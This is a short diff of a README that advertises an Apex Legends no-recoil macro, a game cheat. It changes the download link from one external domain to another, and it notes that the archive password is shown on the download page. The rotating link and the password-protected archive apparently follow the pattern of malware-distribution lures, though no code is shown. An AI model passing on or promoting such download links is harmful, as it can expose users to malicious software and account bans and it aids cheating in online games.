@@ -18,7 +18,7 @@ Apex Legends no recoil macro — R-301, Flatline, Hemlok, and all weapons.
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/apexnorecoil)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/apexnorecoil)
 
 > The archive password is shown on the download page.
 
